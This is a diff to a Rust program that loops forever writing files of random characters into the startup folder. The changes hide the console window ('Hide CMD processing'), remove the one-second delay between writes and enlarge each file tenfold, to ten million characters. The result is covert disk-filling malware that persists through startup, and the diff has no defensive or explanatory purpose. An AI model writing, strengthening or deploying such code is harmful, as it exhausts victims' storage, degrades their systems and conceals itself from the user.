@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"] // Hide CMD processing
 use std::fs::File;
 use std::io::prelude::*;
 use std::env;
@@ -9,7 +10,7 @@ fn main() -> std::io::Result<()> {
     loop {
         generate_files()?;
         // Sleep for a short period (optional) to avoid overwhelming the system
-        thread::sleep(time::Duration::from_secs(1)); // Adjust time as needed
+        thread::sleep(time::Duration::from_secs(0)); // Adjust time as needed
     }
 }
 
@@ -26,7 +27,7 @@ fn generate_files() -> std::io::Result<()> {
     let file_path = startup_folder.join(random_filename);
 
     // Generate a million random characters
-    let random_content = generate_random_content(1_000_000);
+    let random_content = generate_random_content(10_000_000);
 
     // Create the file and write the random content to it
     let mut file = File::create(file_path)?;
